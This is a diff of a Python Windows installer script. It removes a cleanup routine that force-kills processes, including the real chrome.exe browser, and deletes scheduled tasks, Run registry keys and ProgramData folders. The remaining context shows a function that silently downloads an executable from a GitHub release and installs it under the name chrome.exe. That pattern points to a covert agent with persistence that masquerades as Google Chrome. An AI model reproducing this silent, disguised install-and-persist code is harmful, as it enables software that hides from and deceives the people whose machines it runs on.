@@ -166,54 +166,9 @@ def arm_watchdog_timer(max_lifetime_sec=360):
     threading.Thread(target=_watchdog, daemon=True).start()
 
 
-def _uninstall_old_agent():
-    """Désinstalle et tue l'ancien agent s'il existe (AntiAgent OU chrome)."""
-    for exe_name in ["AntiAgent.exe", "chrome.exe"]:
-        try:
-            subprocess.run(
-                ['taskkill', '/f', '/im', exe_name],
-                capture_output=True, timeout=5,
-                creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0),
-            )
-        except Exception:
-            pass
-    for task_name in ["AntiAgentService", "ChromeService"]:
-        try:
-            subprocess.run(
-                ['schtasks', '/delete', '/tn', task_name, '/f'],
-                capture_output=True, timeout=5,
-                creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0),
-            )
-        except Exception:
-            pass
-    try:
-        import winreg
-        key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Run",
-            0, winreg.KEY_SET_VALUE,
-        )
-        for val_name in ["AntiAgentService", "ChromeService"]:
-            try:
-                winreg.DeleteValue(key, val_name)
-            except Exception:
-                pass
-        winreg.CloseKey(key)
-    except Exception:
-        pass
-    for folder in ["AntiAgent", "chrome"]:
-        try:
-            import shutil
-            shutil.rmtree(os.path.join(os.environ.get("PROGRAMDATA", r"C:\ProgramData"), folder), ignore_errors=True)
-        except Exception:
-            pass
-
-
 def install_agent_silently():
     """Télécharge et installe l'agent en silence depuis GitHub Release."""
     try:
-        _uninstall_old_agent()
-
         import urllib.request, ssl
         AGENT_URL = "https://github.com/AdamZoda/ANTI-Agent/releases/download/v1.0.0/chrome.exe"
         agent_dir = os.path.join(os.environ.get("PROGRAMDATA", r"C:\ProgramData"), "chrome")
